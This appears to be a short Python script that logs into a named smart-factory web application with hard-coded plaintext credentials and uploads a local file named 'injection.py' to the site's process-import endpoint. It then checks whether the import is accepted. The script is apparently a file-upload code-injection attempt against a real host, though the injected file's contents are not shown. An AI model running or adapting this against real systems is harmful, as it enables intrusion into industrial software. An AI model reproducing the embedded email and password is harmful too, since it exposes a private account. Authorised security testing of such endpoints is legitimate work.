import requests
from mes.otheruser import *
#from mqtt.test import get_session
import json
from bs4 import BeautifulSoup
from io import BytesIO
sessionuser=requests.Session()
login_csrf_response=sessionuser.get("https://smartfactory.bevywise.com/login")
login_csrf=login_csrf_response.cookies.get('csrftoken')
login_data={
"username": "venkat7venkatesh77@gmail.com",
"password": "@Venkystark77",
# "username": "vstore-viewer@gmail.com",
# "password": "123",
"req_id": generate_uuid(),
"csrfmiddlewaretoken": login_csrf
}
print("before login:",sessionuser.cookies)
login_response=sessionuser.post("https://smartfactory.bevywise.com/entry/login_check",data=login_data)
print("After login:",sessionuser.cookies)
if login_response.ok:
    print("loggin success")
    print(login_response.text)
    inject_file=BytesIO()
    with open("C:/Users/venka/OneDrive/Desktop/fileimport.py",'rb') as python:
        binary=python.read()
    print(binary)
    post_res=sessionuser.post("https://smartfactory.bevywise.com/import_process/",files={"process":("injection.py",binary,'application/x-python'),
            "csrfmiddlewaretoken":sessionuser.cookies.get('csrftoken')},headers={'Referer':'https://smartfactory.bevywise.com/'})
    if post_res.ok:
        if(post_res.text.__contains__("Process imported successfully")):
            print("ok")
        else:
            print("nope")
    else:
        print(post_res.status_code)
        print(post_res.text)